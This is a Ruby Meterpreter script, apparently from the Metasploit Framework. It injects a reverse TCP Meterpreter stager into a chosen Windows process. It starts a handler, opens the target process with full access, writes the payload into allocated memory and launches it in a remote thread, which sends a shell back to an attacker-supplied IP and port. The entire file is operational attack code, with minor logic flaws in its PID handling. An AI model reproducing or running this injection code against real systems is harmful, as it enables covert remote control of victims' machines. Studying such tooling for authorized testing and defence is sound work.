# $Id$
# $Revision$
# Author: Carlos Perez at carlos_perez[at]darkoperator.com
#-------------------------------------------------------------------------------
################## Variable Declarations ##################

@client = client
rhost    = Rex::Socket.source_address("1.2.3.4")
rport    = 4546
lhost    = "127.0.0.1"
pid = nil
proc_name = nil
multi_ip = []
@exec_opts = Rex::Parser::Arguments.new(
	"-h"  => [ false,  "Help menu." ],
	"-r"  => [ true,   "The IP of a remote Metasploit listening for the connect back"],
	"-p"  => [ true,   "The port on the remote host where Metasploit is listening (default: 4546)"],
	"-P"  => [ true,   "PID to inject to if process name not used."],
	"-t"  => [ true,   "Name of the process to inject to if PID not given."]
	)
meter_type = client.platform

################## Function Declarations ##################

# Usage Message Function
#-------------------------------------------------------------------------------
def usage
	print_line "Meterpreter Script for injecting a reverce tcp Meterpreter Payload"
	print_line "in to memory."
	print_line(@exec_opts.usage)
	raise Rex::Script::Completed
end

# Wrong Meterpreter Version Message Function
#-------------------------------------------------------------------------------
def wrong_meter_version(meter = meter_type)
	print_error("#{meter} version of Meterpreter is not supported with this Script!")
	raise Rex::Script::Completed
end

# Function for finding the name of a process given it's PID
#-------------------------------------------------------------------------------
def find_procname(pid)
	name = nil
	@client.sys.process.get_processes.each do |proc|
		if proc['pid'] == pid.to_i
			name = proc['name']
		end
	end
	return name
end

# Find all PID's for a given process name
#-------------------------------------------------------------------------------
def find_pids(name)
	proc_pid = []
	@client.sys.process.get_processes.each do |proc|
		if proc['name'].downcase == name.downcase
			proc_pid << proc['pid']
		end
	end
	return proc_pid
end

# Function for injecting payload in to a given PID
#-------------------------------------------------------------------------------
def inject(target_pid, payload_to_inject)
	print_status("Injecting meterpreter into process ID #{target_pid}")
	begin
		host_process = @client.sys.process.open(target_pid, PROCESS_ALL_ACCESS)
		raw = payload_to_inject.generate
		mem = host_process.memory.allocate(raw.length + (raw.length % 1024))

		print_status("Allocated memory at address #{"0x%.8x" % mem}, for #{raw.length} byte stager")
		print_status("Writing the stager into memory...")
		host_process.memory.write(mem, raw)
		host_process.thread.create(mem, 0)
		print_good("Successfully injected Meterpreter in to process: #{target_pid}")
	rescue::Exception => e
		print_error("Failed to Inject Payload to #{target_pid}!")
		print_error("Error: #{e.class} #{e}")
	end
end

################## Main ##################
@exec_opts.parse(args) { |opt, idx, val|
	case opt
	when "-h"
		usage
	when "-r"
		rhost = val
	when "-p"
		rport = val.to_i
	when "-P"
		pid = val.to_i
	when "-t"
		proc_name = val
	end
}

# Check for Version of Meterpreter
wrong_meter_version(meter_type) if meter_type !~ /win32|win64/i


print_status("Creating a reverse meterpreter stager: LHOST=#{rhost} LPORT=#{rport}")

payload = "windows/meterpreter/reverse_tcp"
pay = client.framework.payloads.create(payload)
pay.datastore['LHOST'] = rhost
pay.datastore['LPORT'] = rport
mul = client.framework.exploits.create("multi/handler")
mul.share_datastore(pay.datastore)
mul.datastore['WORKSPACE'] = client.workspace
mul.datastore['PAYLOAD'] = payload
mul.datastore['EXITFUNC'] = 'process'
mul.datastore['ExitOnSession'] = true
print_status("Running payload handler")
mul.exploit_simple(
	'Payload'  => mul.datastore['PAYLOAD'],
	'RunAsJob' => true
)

if proc_name
	pid = find_pids(proc_name)
	inject(pid,pay)
elsif pid
	inject(pid,pay)
elsif multi_ip.length > 0

else
	print_error("You have to specify a process name or a PID of a process to inject in.")
end
